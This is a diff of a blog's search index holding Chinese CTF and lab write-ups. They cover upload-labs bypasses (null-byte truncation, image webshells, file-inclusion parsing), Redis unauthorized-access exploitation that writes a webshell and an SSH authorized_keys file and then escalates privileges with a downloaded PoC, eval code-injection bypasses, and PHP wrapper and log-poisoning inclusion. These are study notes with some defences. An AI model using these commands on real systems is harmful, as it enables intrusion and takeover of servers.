@@ -1,27 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>upload-labs12~17</title>
-    <url>/2020/12/23/2/</url>
-    <content><![CDATA[<h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><h4 id="白名单和黑名单"><a href="#白名单和黑名单" class="headerlink" title="白名单和黑名单"></a>白名单和黑名单</h4><p><strong>白名单：设置能通过的，白名单以外的不能通过。<br>黑名单:  不能通过，除黑名单以外可以通过。</strong></p>
-<span id="more"></span>
-
-<p>使用白名单，只允许jpg,png,gif，pass路径可控就很好处理了。<br>理解原理：$_GET[‘save_path’]函数是文件最终存储路径。代码里面拼接了一些随机字符，我们可以上传1.jpg，而在 save_path这个最终保存路径函数下面保存为1.php并加上%00来隔断后面的随机字符，这样实际存储到服务器上面路径上就是1.php的后缀了。<br>这里利用的是00截断。即move_uploaded_file函数的底层实现类似于C语言，遇到’\0’会截断。<br>在url中%00等价于ascii码中的0，表示字符串结束，读取结束。<br>截断条件：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、php版本小于5.3.4</span><br><span class="line">2、php.ini的magic_quotes_gpc为OFF状态</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/12/23/2/10.png"><br>上传白名单类型文件，抓包，在路径上添加ant.php%00<br><img src="/2020/12/23/2/11.png"><br>页面出错<br><img src="/2020/12/23/2/12.png"><br>把特殊符号删掉即可连接。<br><img src="/2020/12/23/2/13.png"><br>文件早已成功上传。也可以直接访问ant.php连接。</p>
-<p><img src="/2020/12/23/2/10.png"><br>上传白名单类型文件，抓包，在路径上添加ant.php%00<br><img src="/2020/12/23/2/11.png"><br>页面出错<br><img src="/2020/12/23/2/12.png"><br>把特殊符号删掉即可连接。<br><img src="/2020/12/23/2/13.png"><br>文件早已成功上传。也可以直接访问ant.php连接。</p>
-<h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>请求方式为POST，这里需要将%00url解码，post不像get可以自己解码。<br><img src="/2020/12/23/2/13.5.png"><br><img src="/2020/12/23/2/14.png">，成功上传。</p>
-<h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><p>gif头文件绕过，在一句话木马加GIF89a<br><img src="/2020/12/23/2/15.png">成功上传。<br><strong>制作图片木马</strong><br>先找到一个图片和制作一句话木马(这里可以以txt格式,php格式的文件都可以,我就用php的。)<br><img src="/2020/12/23/2/16.png"><br>因为这里的图片放在桌面，我们要在桌面的位置打开cmd进行操作。<br><img src="/2020/12/23/2/17.png"><br>使用copy命令制作，a表示ascii码文件，b表示二进制文件。<br><img src="/2020/12/23/2/18.png"><br><strong>如果php文件在前，jpg图片内容会复制在其后面，会出错。<br>如果jpg在前面，php一句话木马会复制在jpg内容后面，图片内容不会出错。<br>如果两者交换文件类型图片都无法正常显示。</strong><br>制作成功：<br><img src="/2020/12/23/2/19.png">无法显示。<br>这里不能直接连接图片获得websell，需要解析图片，我们通过文件包含漏洞解析。<br>建议看一下：<a href="https://www.jianshu.com/p/3514f0fd79f7">https://www.jianshu.com/p/3514f0fd79f7</a><br>在upload目录下新建一个php文件写下：<br><code>&lt;?php  $file=$_GET[&#39;page&#39;]; include($file); ?&gt;</code><br>添加include.php这个访问路径，把图片解析成一句话木马。<br><img src="/2020/12/23/2/20.png">连接成功。<br><img src="/2020/12/23/2/21.png">    </p>
-<h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><p>提示：本pass使用getimagesize()检查是否为图片文件！<br>了解函数:用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。<br>这里特别的是它会检查图片内容，所以在copy图片马的时候，不能破坏图片内容，<br><code>copy 1.jpg/b + 2.php/a 666.jpg</code><br><img src="/2020/12/23/2/22.png">制作后，图片还是可以正常显示，用记事本打开内容，一句话木马在最末尾。<br>a表示以ascii写入，b表示二进制。<br><img src="/2020/12/23/2/23.png"></p>
-<h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>这里需要开启php_exif模块，新版的phpstudy没有那个插件，我就下回旧版的，上传图片马即可，十四至十六差不多，只是用了不同的函数检查，<br>都通过文件包含漏洞将图片解析，不同图片类型上传方式也是一样。</p>
-<h3 id="Pass-17-二次渲染"><a href="#Pass-17-二次渲染" class="headerlink" title="Pass-17(二次渲染)"></a>Pass-17(二次渲染)</h3><p>二次渲染:根据用户上传的图片，生成新的图片加入数据库，把原上传的图片删除。<br>先从gif类型图片马上传，上传成功，但是中国蚁剑连接失败，查看一下上传后图片的内容，一句话木马不见了，被二次渲染了。<br><img src="/2020/12/23/2/24.png">原图片的一句话木马是在末尾的，前面我们也有查看过。<br>先下载一个十六制编辑器windex，找到两个图片哪一个位置没有变化，把php代码写进去即可。<br><img src="/2020/12/23/2/25.png">可以连接成功，代码被执行了。<br>还有两种类型，都需要写脚本，相对比较复杂，这里就借鉴大佬的了：<a href="https://xz.aliyun.com/t/2657#toc-13">https://xz.aliyun.com/t/2657#toc-13</a></p>
-]]></content>
-      <tags>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>upload-labs1~11</title>
     <url>/2020/12/20/1/</url>
     <content><![CDATA[<p>webshell：以网页文件形式存在的一种命令执行环境（是一种网页后门），即网页木马文件。</p>
@@ -44,6 +23,27 @@
 <p>在Apache的解析顺序中，是从右到左解析，如果最右侧的扩展名不可识别，就继续往左判断，直到可解析为止</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果上传文件名为1.php.xxxx</span><br><span class="line">因为后缀xxxx无法解析，所以只能解析1.php</span><br></pre></td></tr></table></figure>
 
+]]></content>
+      <tags>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>upload-labs12~17</title>
+    <url>/2020/12/23/2/</url>
+    <content><![CDATA[<h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><h4 id="白名单和黑名单"><a href="#白名单和黑名单" class="headerlink" title="白名单和黑名单"></a>白名单和黑名单</h4><p><strong>白名单：设置能通过的，白名单以外的不能通过。<br>黑名单:  不能通过，除黑名单以外可以通过。</strong></p>
+<span id="more"></span>
+
+<p>使用白名单，只允许jpg,png,gif，pass路径可控就很好处理了。<br>理解原理：$_GET[‘save_path’]函数是文件最终存储路径。代码里面拼接了一些随机字符，我们可以上传1.jpg，而在 save_path这个最终保存路径函数下面保存为1.php并加上%00来隔断后面的随机字符，这样实际存储到服务器上面路径上就是1.php的后缀了。<br>这里利用的是00截断。即move_uploaded_file函数的底层实现类似于C语言，遇到’\0’会截断。<br>在url中%00等价于ascii码中的0，表示字符串结束，读取结束。<br>截断条件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、php版本小于5.3.4</span><br><span class="line">2、php.ini的magic_quotes_gpc为OFF状态</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/23/2/10.png"><br>上传白名单类型文件，抓包，在路径上添加ant.php%00<br><img src="/2020/12/23/2/11.png"><br>页面出错<br><img src="/2020/12/23/2/12.png"><br>把特殊符号删掉即可连接。<br><img src="/2020/12/23/2/13.png"><br>文件早已成功上传。也可以直接访问ant.php连接。</p>
+<p><img src="/2020/12/23/2/10.png"><br>上传白名单类型文件，抓包，在路径上添加ant.php%00<br><img src="/2020/12/23/2/11.png"><br>页面出错<br><img src="/2020/12/23/2/12.png"><br>把特殊符号删掉即可连接。<br><img src="/2020/12/23/2/13.png"><br>文件早已成功上传。也可以直接访问ant.php连接。</p>
+<h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>请求方式为POST，这里需要将%00url解码，post不像get可以自己解码。<br><img src="/2020/12/23/2/13.5.png"><br><img src="/2020/12/23/2/14.png">，成功上传。</p>
+<h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><p>gif头文件绕过，在一句话木马加GIF89a<br><img src="/2020/12/23/2/15.png">成功上传。<br><strong>制作图片木马</strong><br>先找到一个图片和制作一句话木马(这里可以以txt格式,php格式的文件都可以,我就用php的。)<br><img src="/2020/12/23/2/16.png"><br>因为这里的图片放在桌面，我们要在桌面的位置打开cmd进行操作。<br><img src="/2020/12/23/2/17.png"><br>使用copy命令制作，a表示ascii码文件，b表示二进制文件。<br><img src="/2020/12/23/2/18.png"><br><strong>如果php文件在前，jpg图片内容会复制在其后面，会出错。<br>如果jpg在前面，php一句话木马会复制在jpg内容后面，图片内容不会出错。<br>如果两者交换文件类型图片都无法正常显示。</strong><br>制作成功：<br><img src="/2020/12/23/2/19.png">无法显示。<br>这里不能直接连接图片获得websell，需要解析图片，我们通过文件包含漏洞解析。<br>建议看一下：<a href="https://www.jianshu.com/p/3514f0fd79f7">https://www.jianshu.com/p/3514f0fd79f7</a><br>在upload目录下新建一个php文件写下：<br><code>&lt;?php  $file=$_GET[&#39;page&#39;]; include($file); ?&gt;</code><br>添加include.php这个访问路径，把图片解析成一句话木马。<br><img src="/2020/12/23/2/20.png">连接成功。<br><img src="/2020/12/23/2/21.png">    </p>
+<h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><p>提示：本pass使用getimagesize()检查是否为图片文件！<br>了解函数:用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。<br>这里特别的是它会检查图片内容，所以在copy图片马的时候，不能破坏图片内容，<br><code>copy 1.jpg/b + 2.php/a 666.jpg</code><br><img src="/2020/12/23/2/22.png">制作后，图片还是可以正常显示，用记事本打开内容，一句话木马在最末尾。<br>a表示以ascii写入，b表示二进制。<br><img src="/2020/12/23/2/23.png"></p>
+<h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>这里需要开启php_exif模块，新版的phpstudy没有那个插件，我就下回旧版的，上传图片马即可，十四至十六差不多，只是用了不同的函数检查，<br>都通过文件包含漏洞将图片解析，不同图片类型上传方式也是一样。</p>
+<h3 id="Pass-17-二次渲染"><a href="#Pass-17-二次渲染" class="headerlink" title="Pass-17(二次渲染)"></a>Pass-17(二次渲染)</h3><p>二次渲染:根据用户上传的图片，生成新的图片加入数据库，把原上传的图片删除。<br>先从gif类型图片马上传，上传成功，但是中国蚁剑连接失败，查看一下上传后图片的内容，一句话木马不见了，被二次渲染了。<br><img src="/2020/12/23/2/24.png">原图片的一句话木马是在末尾的，前面我们也有查看过。<br>先下载一个十六制编辑器windex，找到两个图片哪一个位置没有变化，把php代码写进去即可。<br><img src="/2020/12/23/2/25.png">可以连接成功，代码被执行了。<br>还有两种类型，都需要写脚本，相对比较复杂，这里就借鉴大佬的了：<a href="https://xz.aliyun.com/t/2657#toc-13">https://xz.aliyun.com/t/2657#toc-13</a></p>
 ]]></content>
       <tags>
         <tag>文件上传</tag>
@@ -165,6 +165,103 @@
 <ul>
 <li>flag被注释的时候，执行命令查看flag时，可用type flag。</li>
 </ul>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTF-Redis未授权访问漏洞利用与防御</title>
+    <url>/2021/05/27/CTF-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
+    <content><![CDATA[<h3 id="Redis未授权访问漏洞利用与防御"><a href="#Redis未授权访问漏洞利用与防御" class="headerlink" title="Redis未授权访问漏洞利用与防御"></a>Redis未授权访问漏洞利用与防御</h3><h4 id="Redis漏洞"><a href="#Redis漏洞" class="headerlink" title="Redis漏洞"></a>Redis漏洞</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Redis配置不当可导致未授权访问，被恶意利用。部分服务器上的Redis绑定在0.0.0.0：6379,并且没有开启认证(这是Redis的默认配置)，以及该端口可通过公网直接访问，如果没有采取相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等，将会导致Redis服务器直接暴露在公网上，可能造成其他用户直接在非授权情况下直接访问呢Redis服务并进行相关操作。</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+
+
+<h4 id="Redis服务实验环境搭建"><a href="#Redis服务实验环境搭建" class="headerlink" title="Redis服务实验环境搭建"></a>Redis服务实验环境搭建</h4><p>kali linux下环境搭建：</p>
+<p>1、Redis安装包下载与安装</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-3.2.0.tar.gz</span><br><span class="line">tar xzf redis-3.2.0</span><br><span class="line">cd redis-3.2.0</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2、配置Redis</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim redis.conf</span><br><span class="line">1、bind 127.0.0.1 前面加上#</span><br><span class="line">2、protected-mode设为no</span><br></pre></td></tr></table></figure>
+
+
+
+<p>3、加载配置文件启动Redis服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd src</span><br><span class="line">redis-server ../redis-conf</span><br></pre></td></tr></table></figure>
+
+
+
+<p>4、查看6379端口是否启动</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p 6379 --script redis-info +redis服务器ip地址</span><br></pre></td></tr></table></figure>
+
+
+
+<p>通过连接redis服务，执行info命令，探测出当前redis存在未授权访问漏洞</p>
+<p>Redis客户端连接服务端</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h +redis服务器ip地址</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Redis未授权漏洞利用"><a href="#Redis未授权漏洞利用" class="headerlink" title="Redis未授权漏洞利用"></a>Redis未授权漏洞利用</h4><p>利用漏洞 写入webshell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/www/html</span><br><span class="line">set x &quot;\n\n\n&lt;?php phpinfo();?&gt;\n\n\n&quot;</span><br><span class="line">config set dbfilename webshell.php </span><br><span class="line">save\\保存文件</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由可写webshell到指定路径，就可以写其他具有权限的文件，如计划任务，ssh密钥文件。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="Redis漏洞防御"><a href="#Redis漏洞防御" class="headerlink" title="Redis漏洞防御"></a>Redis漏洞防御</h4><p>1、增加密码认证</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#requirepass foobared</span><br><span class="line">requirepass +密码</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2、绑定内网ip地址</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h4 id="Redis未授权添加ssh密钥"><a href="#Redis未授权添加ssh密钥" class="headerlink" title="Redis未授权添加ssh密钥"></a>Redis未授权添加ssh密钥</h4><p>1、nmap探测目标是否存在redis服务(6379)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 端口 ip</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2、测试redis服务是否存在未授权访问</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 服务端地址</span><br><span class="line">info</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>3、ssh密钥生成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">cd ~/.ssh/</span><br><span class="line">(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt;public.txt</span><br><span class="line">两个换行</span><br></pre></td></tr></table></figure>
+
+
+
+<p>4、 上传密钥</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat public.txt |redis-cli -h ip -x set x //将文件内容读取到变量x，通过-x执行相关命令，相当于set x=public.txt文件内容</span><br><span class="line"></span><br><span class="line">redis-cli -h ip config set dir &quot;/home/user/.ssh/&quot; user需要破解，可尝试直接访问/~/.ssh/</span><br><span class="line"></span><br><span class="line">redis-cli -h ip config set dbfilename authorized_keys</span><br><span class="line"></span><br><span class="line">redis-cli -h ip save </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -l user -i id_rsa ip</span><br><span class="line">连接失败</span><br><span class="line">扫描22端口</span><br><span class="line">nmap -p 22 ip</span><br><span class="line">22端口关闭</span><br><span class="line">扫描所有端口</span><br><span class="line">namp -p 1-65535 -T4 -n -v ip</span><br><span class="line"></span><br><span class="line">发现一个novation服务也是ssh服务标识</span><br><span class="line"></span><br><span class="line">ssh -l user -p 1322 -i</span><br><span class="line">用户名还是需要爆破的，后面连接需要用到。</span><br><span class="line">不具有最高权限</span><br></pre></td></tr></table></figure>
+
+
+
+<p>5、提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -a </span><br><span class="line">查看版本相关信息</span><br><span class="line">百度搜索相关漏洞</span><br><span class="line">https://www.exploit-db.com/</span><br><span class="line"></span><br><span class="line">mkdir tmp</span><br><span class="line">cd tmp</span><br><span class="line">wget ... poc.c 下载相关漏洞</span><br><span class="line">gcc poc.c </span><br><span class="line">然后执行新生成的文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <tags>
         <tag>CTF</tag>
@@ -296,103 +393,6 @@
 
 <p>设置唯一键</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table admin add unique (username)</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF-Redis未授权访问漏洞利用与防御</title>
-    <url>/2021/05/27/CTF-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
-    <content><![CDATA[<h3 id="Redis未授权访问漏洞利用与防御"><a href="#Redis未授权访问漏洞利用与防御" class="headerlink" title="Redis未授权访问漏洞利用与防御"></a>Redis未授权访问漏洞利用与防御</h3><h4 id="Redis漏洞"><a href="#Redis漏洞" class="headerlink" title="Redis漏洞"></a>Redis漏洞</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Redis配置不当可导致未授权访问，被恶意利用。部分服务器上的Redis绑定在0.0.0.0：6379,并且没有开启认证(这是Redis的默认配置)，以及该端口可通过公网直接访问，如果没有采取相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等，将会导致Redis服务器直接暴露在公网上，可能造成其他用户直接在非授权情况下直接访问呢Redis服务并进行相关操作。</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-
-
-<h4 id="Redis服务实验环境搭建"><a href="#Redis服务实验环境搭建" class="headerlink" title="Redis服务实验环境搭建"></a>Redis服务实验环境搭建</h4><p>kali linux下环境搭建：</p>
-<p>1、Redis安装包下载与安装</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-3.2.0.tar.gz</span><br><span class="line">tar xzf redis-3.2.0</span><br><span class="line">cd redis-3.2.0</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
-
-
-
-<p>2、配置Redis</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim redis.conf</span><br><span class="line">1、bind 127.0.0.1 前面加上#</span><br><span class="line">2、protected-mode设为no</span><br></pre></td></tr></table></figure>
-
-
-
-<p>3、加载配置文件启动Redis服务</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd src</span><br><span class="line">redis-server ../redis-conf</span><br></pre></td></tr></table></figure>
-
-
-
-<p>4、查看6379端口是否启动</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p 6379 --script redis-info +redis服务器ip地址</span><br></pre></td></tr></table></figure>
-
-
-
-<p>通过连接redis服务，执行info命令，探测出当前redis存在未授权访问漏洞</p>
-<p>Redis客户端连接服务端</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h +redis服务器ip地址</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="Redis未授权漏洞利用"><a href="#Redis未授权漏洞利用" class="headerlink" title="Redis未授权漏洞利用"></a>Redis未授权漏洞利用</h4><p>利用漏洞 写入webshell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/www/html</span><br><span class="line">set x &quot;\n\n\n&lt;?php phpinfo();?&gt;\n\n\n&quot;</span><br><span class="line">config set dbfilename webshell.php </span><br><span class="line">save\\保存文件</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由可写webshell到指定路径，就可以写其他具有权限的文件，如计划任务，ssh密钥文件。</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h4 id="Redis漏洞防御"><a href="#Redis漏洞防御" class="headerlink" title="Redis漏洞防御"></a>Redis漏洞防御</h4><p>1、增加密码认证</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#requirepass foobared</span><br><span class="line">requirepass +密码</span><br></pre></td></tr></table></figure>
-
-
-
-<p>2、绑定内网ip地址</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<h4 id="Redis未授权添加ssh密钥"><a href="#Redis未授权添加ssh密钥" class="headerlink" title="Redis未授权添加ssh密钥"></a>Redis未授权添加ssh密钥</h4><p>1、nmap探测目标是否存在redis服务(6379)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 端口 ip</span><br></pre></td></tr></table></figure>
-
-
-
-<p>2、测试redis服务是否存在未授权访问</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 服务端地址</span><br><span class="line">info</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>3、ssh密钥生成</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">cd ~/.ssh/</span><br><span class="line">(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt;public.txt</span><br><span class="line">两个换行</span><br></pre></td></tr></table></figure>
-
-
-
-<p>4、 上传密钥</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat public.txt |redis-cli -h ip -x set x //将文件内容读取到变量x，通过-x执行相关命令，相当于set x=public.txt文件内容</span><br><span class="line"></span><br><span class="line">redis-cli -h ip config set dir &quot;/home/user/.ssh/&quot; user需要破解，可尝试直接访问/~/.ssh/</span><br><span class="line"></span><br><span class="line">redis-cli -h ip config set dbfilename authorized_keys</span><br><span class="line"></span><br><span class="line">redis-cli -h ip save </span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -l user -i id_rsa ip</span><br><span class="line">连接失败</span><br><span class="line">扫描22端口</span><br><span class="line">nmap -p 22 ip</span><br><span class="line">22端口关闭</span><br><span class="line">扫描所有端口</span><br><span class="line">namp -p 1-65535 -T4 -n -v ip</span><br><span class="line"></span><br><span class="line">发现一个novation服务也是ssh服务标识</span><br><span class="line"></span><br><span class="line">ssh -l user -p 1322 -i</span><br><span class="line">用户名还是需要爆破的，后面连接需要用到。</span><br><span class="line">不具有最高权限</span><br></pre></td></tr></table></figure>
-
-
-
-<p>5、提权</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -a </span><br><span class="line">查看版本相关信息</span><br><span class="line">百度搜索相关漏洞</span><br><span class="line">https://www.exploit-db.com/</span><br><span class="line"></span><br><span class="line">mkdir tmp</span><br><span class="line">cd tmp</span><br><span class="line">wget ... poc.c 下载相关漏洞</span><br><span class="line">gcc poc.c </span><br><span class="line">然后执行新生成的文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <tags>
@@ -826,61 +826,71 @@
       </tags>
   </entry>
   <entry>
-    <title>CTF-文件包含</title>
-    <url>/2021/05/23/CTF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    <content><![CDATA[<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php伪协议事实上就是其支持的协议与封装协议</span><br></pre></td></tr></table></figure>
-
+    <title>CTF-代码执行</title>
+    <url>/2021/05/21/CTF-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
+    <content><![CDATA[<h2 id="代码执行介绍"><a href="#代码执行介绍" class="headerlink" title="代码执行介绍"></a>代码执行介绍</h2><p>五类相关函数</p>
+<p>1、eval+assert函数</p>
+<p>2、preg_replace/e最新php不支持，php5广泛使用</p>
+<p>3、用户自定义函数</p>
+<p>4、动态函数</p>
+<p>5、其他</p>
 <span id="more"></span>
 
-<p>参考文档：</p>
-<p><a href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p>
-<p>当只允许上传zip文件</p>
-<p>使用zip协议phar协议解压</p>
-<p>文件包含漏洞</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">	include($file.&quot;php&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>1、</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(php4 php5 php7)--把字符串作为php代码执行，当用户可以控制字符串内容，那么此时存在代码注入漏洞。</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	eval(&#x27;phpinfo;&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line">eval执行的代码必须加分号，不然会报错。</span><br><span class="line">assert类似，但是兼容性更强，字符串中可不加分号，但是php7.1以上已经废弃assert</span><br></pre></td></tr></table></figure>
 
 
 
-<p>绕过方法：</p>
-<p>新建一个test.php</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>安全人员防御：加引号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">	eval(&quot;\$ret=strtolower(&#x27;$cmd&#x27;);&quot;)//将字符串转为小写，反斜杠转义$,为了不当做变量处理</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>使用zip进行无损压缩test.php，phpinfo.zip</p>
-<p>利用伪协议 解压缩zip文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=zip://upload/phpinfo.zip%23phpinfo</span><br><span class="line">?file=phar://upload/phpinfo.zip/phpinfo</span><br><span class="line">phar要在php5.3后的版本使用</span><br></pre></td></tr></table></figure>
+<p>绕过姿势：</p>
+<p>闭合+注释</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;);phpinfo();//注释掉后面的内容</span><br><span class="line">传入变成</span><br><span class="line">$ret=strtolower(&#x27;&#x27;);phpinfo();//</span><br></pre></td></tr></table></figure>
 
-<p>如果后面拼接的是jpg，</p>
-<p>解决方法，新建php文件改名为jpg，然后压缩即可。</p>
-<h4 id="日志文件的利用"><a href="#日志文件的利用" class="headerlink" title="日志文件的利用"></a>日志文件的利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无法找到包含的文件，此时可使用日志文件</span><br></pre></td></tr></table></figure>
+<p>如果安全人员开启了GPC将无法绕过</p>
+<p>因为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;会变成\&#x27;</span><br></pre></td></tr></table></figure>
 
-<p>环境：httpd.conf文件中的配置CustomLog”logs/access.log”common</p>
-<p>通过burp访问参数，不然会记录到日志文件后会被URL编码，导致无法当作php代码执行。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=&lt;?php+phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>然后通过文件包含漏洞页面</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=../../../Extensions\Apache2.4.39\logs/access.log</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在php5之前，magic_quotes_gpc默认开启，但是在php的cookies中，如果有单引号将会被反斜杠转义，现在差不多淘汰，一般使用stripslashes函数转义</span><br><span class="line">传入1&#x27;直接变成\&#x27;</span><br></pre></td></tr></table></figure>
 
 
 
 
 
-<h4 id="session会话利用"><a href="#session会话利用" class="headerlink" title="session会话利用"></a>session会话利用</h4><p>关键点：</p>
-<p>php7.2之后，提供了如果提交表单数据具有PHP_SESSION_UPLOAD_PROGRESS=上传后具体session名称 和file=@具体文件路径，此时可保存指定session名称的会话文件。</p>
-<p>session_upload_progress.enabled开启</p>
